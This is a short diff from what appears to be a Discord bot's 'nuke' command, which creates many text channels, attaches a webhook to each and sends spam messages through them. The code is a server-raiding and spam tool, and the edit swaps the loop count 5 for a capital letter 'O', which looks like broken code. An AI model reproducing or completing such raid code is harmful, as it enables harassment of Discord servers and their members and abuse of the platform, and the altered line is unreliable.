@@ -65,7 +65,7 @@ async def nuke(ctx):
         try:
             channel = await guild.create_text_channel(f"{channel_name}-{i}")
             webhook = await channel.create_webhook(name=webhook_name)
-            for _ in range(5):  # Reduce spam to avoid API abuse
+            for _ in range(O):  # Reduce spam to avoid API abuse
                 try:
                     await webhook.send(spam_message, username=webhook_name, avatar_url=webhook_pfp)
                 except Exception as e:
